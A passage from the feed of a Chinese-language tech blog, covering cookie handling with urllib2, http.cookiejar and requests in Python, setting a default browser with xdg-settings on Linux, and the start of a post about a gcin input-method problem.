&lt;/ul&gt;</summary><category term="Python"></category><category term="Django"></category><category term="RESTful API"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Python 中讓 urllib 使用 cookie 的方法</title><link href="https://blog.m157q.tw/posts/2018/01/06/use-cookie-with-urllib-in-python/" rel="alternate"></link><published>2018-01-07T01:42:00+08:00</published><updated>2018-01-07T01:42:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-06:posts/2018/01/06/use-cookie-with-urllib-in-python/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實一般來說只要用 &lt;a href="https://github.com/requests/requests"&gt;&lt;code&gt;requests&lt;/code&gt;&lt;/a&gt; 這個超強的 third-party library 就可以解了，&lt;code&gt;requests&lt;/code&gt; 已經把 Cookie 的部份處理好了，那為什麼要紀錄這篇？其實這問題也是約莫一年前在前公司工作時遇到的問題，以下說明一下：  &lt;/p&gt;
&lt;p&gt;Google App Engine Standard Environment 除了預設使用 Python 2 以外，加上因為是 PaaS 的關係，做了不少限制，直接拿 &lt;code&gt;requests&lt;/code&gt; 來用的話會無法使用，必須再搭配 &lt;a href="https://github.com/requests/toolbelt"&gt;&lt;code&gt;requests-toolbelt&lt;/code&gt;&lt;/a&gt; 這個工具，讓 &lt;code&gt;requests&lt;/code&gt; 在 GAE Standard 上使用的時候，底層會抽換成 GAE 提供的 &lt;code&gt;urlfetch&lt;/code&gt;，這樣才能使用，而在 GAE Standard 上預設可以使用 &lt;code&gt;urlfetch&lt;/code&gt; 和 &lt;code&gt;urllib2&lt;/code&gt;。  &lt;/p&gt;
&lt;p&gt;那為什麼不用 &lt;code&gt;requests&lt;/code&gt; 就好了？因為 Legacy code 的緣故，無法很輕易使用 &lt;code&gt;requests&lt;/code&gt;，所以採用 &lt;code&gt;urllib2&lt;/code&gt;，但又遇到有需要使用 Cookie 的需求，而 &lt;code&gt;urllib2&lt;/code&gt; 是沒有支援 Cookie 的，所以就必須再搭配 &lt;code&gt;cookielib&lt;/code&gt; 來使用。  &lt;/p&gt;
&lt;p&gt;就用這篇文章紀錄一下作法，順便連 Python 3 的寫法也順便紀錄一下，因為 Python 2 裡的 &lt;code&gt;urllib2&lt;/code&gt; 和 &lt;code&gt;cookielib&lt;/code&gt; 在 Python 3 裡頭都有做更動。順便也把最簡單的 &lt;code&gt;requests&lt;/code&gt; 的寫法也一併附上。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 2: &lt;code&gt;urllib2&lt;/code&gt; + &lt;code&gt;cookielib&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Python 2 中的 &lt;code&gt;urllib2&lt;/code&gt; 是 &lt;code&gt;urllib&lt;/code&gt; 的加強版，在實際使用上比較常使用 &lt;code&gt;urllib2&lt;/code&gt;，所以這裡直接講 &lt;code&gt;urllib2&lt;/code&gt; 的寫法。&lt;/strong&gt;  &lt;/p&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;p&gt;範例其實在官方網站的說明文件最底下的範例就有了：&lt;a href="https://docs.python.org/2/library/cookielib.html#examples"&gt;20.21. cookielib — Cookie handling for HTTP clients — Python 2.7.14 documentation&lt;/a&gt;，其實也不會很複雜。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cookielib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib2&lt;/span&gt;  
&lt;span class="n"&gt;cj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cookielib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;opener&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;build_opener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPCookieProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cj&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;opener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://example.com/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;不從檔案匯入，直接設定 Cookie&lt;/h3&gt;
&lt;p&gt;但如果今天我們沒有一份先存好的 Cookie 設定檔，卻又想在發送 request 前預先設定一些 Cookie 的 value 怎麼辦？先講結論：「有辦法做到，但不推薦使用。」（如果是要改 "User-Agent" 的話，這個是 request header，而不是 cookie，所以是 &lt;code&gt;urllib&lt;/code&gt; 要處理，而不是 &lt;code&gt;cookielib&lt;/code&gt; 處理，請勿搞混。）  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cookielib.CookieJar&lt;/code&gt; 有個 &lt;code&gt;set_cookie()&lt;/code&gt; 的函式，其預設接收的參數是 &lt;code&gt;cookielib.Cookie&lt;/code&gt;，但 &lt;code&gt;cookielib.Cookie&lt;/code&gt; 的文件中卻有著以下這段說明：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This class represents Netscape, RFC 2109 and RFC 2965 cookies. It is not expected that users of &lt;code&gt;cookielib&lt;/code&gt; construct their own &lt;code&gt;Cookie&lt;/code&gt; instances. Instead, if necessary, call &lt;code&gt;make_cookies()&lt;/code&gt; on a &lt;code&gt;CookieJar&lt;/code&gt; instance.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是說，預設其實是不期望使用者自己設定 Cookie 的，但並不是不能做到，這個在 StackOverflow 上的回答有給出範例：&lt;a href="https://stackoverflow.com/questions/4685337/python-add-cookie-to-cookiejar#12682437"&gt;python - add cookie to cookiejar - Stack Overflow&lt;/a&gt;，但我自己是覺得非常的不直觀，用這種開發方式應該很難維護，除非初始化 &lt;code&gt;cookielib.Cookie&lt;/code&gt; 的時候把參數的 key 都加上去。順待一提，這篇文章的提問者誤把 &lt;code&gt;Cookie.SimpleCooke&lt;/code&gt; 丟給 &lt;code&gt;cookielib.CookieJar.set_cookie()&lt;/code&gt; 當參數餵入，但這個函式可以接受的參數必須是 &lt;code&gt;cookielib.Cookie&lt;/code&gt;，而不是 &lt;code&gt;Cookie.SimpleCookie&lt;/code&gt;，所以出了錯，而且這兩者並沒有任何關係，完全是繼承自不同的 class。  &lt;/p&gt;
&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html#cookielib.FileCookieJar.save"&gt;&lt;code&gt;cookielib.FileCookieJar.save&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;將現有的 Cookie export 到檔案中。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html#cookielib.FileCookieJar.load"&gt;&lt;code&gt;cookielib.FileCookieJar.load&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從檔案中 import Cookie 的設定進來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這樣一來在實作爬蟲時，遇到會利用 Cookie 來判斷使用者是否登入的網站時就很方便。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 3: &lt;code&gt;urllib.request&lt;/code&gt; + &lt;code&gt;http.cookiejar&lt;/code&gt;&lt;/h2&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;p&gt;一樣在 Python 官方的說明文件底下就有範例可以參考了：&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#examples"&gt;21.24. http.cookiejar — Cookie handling for HTTP clients — Python 3.6.4 documentation&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;http.cookiejar&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib.request&lt;/span&gt;  
&lt;span class="n"&gt;cj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookiejar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;opener&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;build_opener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPCookieProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cj&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;opener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://example.com/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其實可以看到跟 Python 2 的寫法一模一樣，只是把 &lt;code&gt;cookielib&lt;/code&gt; 換成 &lt;code&gt;http.cookiejar&lt;/code&gt;，&lt;code&gt;urllib2&lt;/code&gt; 換成 &lt;code&gt;urllib.request&lt;/code&gt; 而已。  &lt;/p&gt;
&lt;h3&gt;不從檔案匯入，直接設定 Cookie。&lt;/h3&gt;
&lt;p&gt;這部份跟 Python 2 一樣，可以做到，但不推薦，就不贅述。  &lt;/p&gt;
&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#http.cookiejar.FileCookieJar.save"&gt;&lt;code&gt;http.cookiejar.FileCookieJar.save&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;將目前的 Cookie 匯出到檔案。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#http.cookiejar.FileCookieJar.load"&gt;&lt;code&gt;http.cookiejar.FileCookieJar.load&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從現有的檔案中匯入 Cookie。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;requests&lt;/h2&gt;
&lt;p&gt;官方文件的 Quickstart 就有一個關於 Cookies 的部份：&lt;a href="http://docs.python-requests.org/en/master/user/quickstart/#cookies"&gt;Quickstart — Requests 2.18.4 documentation&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;requests&lt;/code&gt; 本身就自帶 Cookie 的處理了，用法簡單了許多：  &lt;/p&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;If a response contains some Cookies, you can quickly access them:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://example.com/some/cookie/setting/url&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;example_cookie_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;example_cookie_value&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;To send your own cookies to the server, you can use the cookies parameter:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://httpbin.org/cookies&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookies_are&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;working&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;{&amp;quot;cookies&amp;quot;: {&amp;quot;cookies_are&amp;quot;: &amp;quot;working&amp;quot;}}&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;不從檔案匯入，直接設定 Cookie。&lt;/h3&gt;
&lt;p&gt;基本上這邊的作法就是上面 Python 2 那邊提到的作法，不過 &lt;code&gt;requests&lt;/code&gt; 把剛剛說的加上參數 key  這件事情稍微處理了一下。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Cookies are returned in a &lt;code&gt;RequestsCookieJar&lt;/code&gt;, which acts like a &lt;code&gt;dict&lt;/code&gt; but also offers a more complete interface, suitable for use over multiple domains or paths. Cookie jars can also be passed in to requests:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestsCookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tasty_cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yum&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;httpbin.org&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cookies&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;gross_cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blech&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;httpbin.org&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/elsewhere&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://httpbin.org/cookies&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;{&amp;quot;cookies&amp;quot;: {&amp;quot;tasty_cookie&amp;quot;: &amp;quot;yum&amp;quot;}}&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;p&gt;這部份在 &lt;code&gt;requests&lt;/code&gt; 就比較麻煩一點，但也不難，需要額外用到 &lt;code&gt;requests.utils.dict_from_cookiejar()&lt;/code&gt;，詳細可以參考這篇 StackOverflow 的解答：&lt;a href="https://stackoverflow.com/questions/13030095/how-to-save-requests-python-cookies-to-a-file/13031628#13031628"&gt;How to save requests (python) cookies to a file? - Stack Overflow&lt;/a&gt;，它還有用到 &lt;code&gt;pickle&lt;/code&gt; 這個函式庫。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;無論是 &lt;code&gt;requests.Response.cookies&lt;/code&gt; 或 &lt;code&gt;requests.Sessions.Session.cookies&lt;/code&gt; 都是 &lt;code&gt;requests.cookies.cookiejar_from_dict()&lt;/code&gt; 的輸出結果。  &lt;/li&gt;
&lt;li&gt;可以用 &lt;code&gt;requests.utils.dict_from_cookiejar()&lt;/code&gt; 這個函式，將 &lt;code&gt;response.cookies&lt;/code&gt; 或是 &lt;code&gt;session.cookies&lt;/code&gt; 當作輸入，就可以得到該 Cookie 以 &lt;code&gt;dict&lt;/code&gt; 方式呈現結果，當然也就可以匯出到檔案。  &lt;/li&gt;
&lt;li&gt;要匯入的話，可以使用 &lt;code&gt;requests.utils.cookiejar_from_dict()&lt;/code&gt; 這個參數來把 &lt;code&gt;dict&lt;/code&gt; 轉成 &lt;code&gt;RequestsCookieJar&lt;/code&gt;。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;requests.utils.cookiejar_from_dict()&lt;/code&gt; 是從 &lt;code&gt;requests.cookies&lt;/code&gt; import 來的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用到 &lt;code&gt;pickle&lt;/code&gt; 只是方便以 &lt;code&gt;pickle&lt;/code&gt; 的形式儲存而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;能用 &lt;code&gt;requests&lt;/code&gt; 的話當然就直接用吧，如果遇到我提到的這種狀況才會需要特殊的解法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2018026/what-are-the-differences-between-the-urllib-urllib2-and-requests-module"&gt;python - What are the differences between the urllib, urllib2, and requests module? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requests/requests"&gt;GitHub - requests/requests: Python HTTP Requests for Humans™ ✨🍰✨&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requests/toolbelt"&gt;GitHub - requests/toolbelt: A toolbelt of useful classes and functions to be used with python-requests&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2.7/library/urllib.html?highlight=urllib"&gt;20.5. urllib — Open arbitrary resources by URL — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2.7/library/urllib2.html"&gt;20.6. urllib2 — extensible library for opening URLs — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html"&gt;20.21. cookielib — Cookie handling for HTTP clients — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/urllib.html?highlight=urllib"&gt;21.5. urllib — URL handling modules — Python 3.6.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#module-http.cookiejar"&gt;21.24. http.cookiejar — Cookie handling for HTTP clients — Python 3.6.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python-requests.org/en/master/user/quickstart/#cookies"&gt;Quickstart — Requests 2.18.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Python 2"></category><category term="Python 3"></category><category term="urllib"></category><category term="cookie"></category><category term="requests"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 設定桌面環境預設開啟程式</title><link href="https://blog.m157q.tw/posts/2018/01/05/set-default-application-in-desktop-environment-on-linux/" rel="alternate"></link><published>2018-01-06T00:52:26+08:00</published><updated>2018-01-06T00:52:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-05:posts/2018/01/05/set-default-application-in-desktop-environment-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;xdg-settings {get | check | set} {property} [subproperty] [value]&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實主要是最近用了 qutebrowser 以後，要把預設瀏覽器從 Firefox 改成 qutebrowser，因為在 qutebrowser 的設定裡頭找不到，查了 qutebrowser 的說明也沒看到，後來發現一個指令就可以做掉了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;如果是 CLI 環境的話，可以透過 &lt;code&gt;EDITOR&lt;/code&gt;, &lt;code&gt;BROWSER&lt;/code&gt; 等環境變數來做設定。  &lt;/p&gt;
&lt;p&gt;如果是桌面環境的話，我通常是在我使用的應用程式裏面找看看有沒有可以把該程式設定為預設開啟程式的選項，但因為這在 qutebrowser 上行不通，所以用下面這個方法。  &lt;/p&gt;
&lt;p&gt;只要是走 &lt;a href="https://specifications.freedesktop.org/mime-apps-spec/mime-apps-spec-1.0.html"&gt;XDG 標準&lt;/a&gt; 都可以用這個設定方式。（XDG 為 X Desktop Group 的縮寫）  &lt;/p&gt;
&lt;p&gt;XDG 的設定檔有下面三種路徑：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;個別使用者設定檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;~/.config/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所有使用者共用  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/xdg/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系統預設設定檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/usr/local/share/applications/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/share/applications/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但我修改了以後發現沒用，所以就直接透過 &lt;code&gt;xdg-settings&lt;/code&gt; 這個指令做設定，&lt;br /&gt;
後來用下面這一行解決：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;xdg-settings set default-web-browser qutebrowser.desktop&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;xdg-settings --list&lt;/code&gt; 可以察看有哪些 XDG properties 可以設定。  &lt;/p&gt;
&lt;p&gt;詳細內容可以參考這篇文章：&lt;a href="https://wiki.archlinux.org/index.php/Default_applications#xdg-utils"&gt;Default applications - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Default_applications#xdg-utils"&gt;Default applications - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Freedesktop.org"&gt;freedesktop.org - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Desktop"></category><category term="XDG"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>解決 Arch Linux 上 gcin 2.8.5-2 無法在 Qt 5.9.x 以後的應用程式中執行的問題</title><link href="https://blog.m157q.tw/posts/2018/01/04/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/" rel="alternate"></link><published>2018-01-05T01:21:00+08:00</published><updated>2018-01-05T01:21:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-04:posts/2018/01/04/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
